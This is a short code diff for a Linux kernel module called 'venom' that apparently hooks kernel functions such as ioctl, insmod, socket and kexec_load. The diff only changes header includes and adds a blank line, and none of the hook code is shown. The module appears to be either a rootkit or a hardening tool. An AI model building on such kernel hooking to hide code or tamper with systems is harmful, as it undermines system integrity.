@@ -15,7 +15,9 @@
 #include "hooks/ioctl.h"
 #include "hooks/insmod.h"
 #include "hooks/network.h"
-#include "hooks/ftruncate.h"
+#include "hooks/harden.h"
+#include "hooks/socket.h"
+#include "hooks/kexec_load.h" 
 
 
 MODULE_LICENSE("GPL");
@@ -144,4 +146,5 @@ notrace static void __exit venom_exit(void) {
 
 module_init(venom_init);
 module_exit(venom_exit); 
+
 
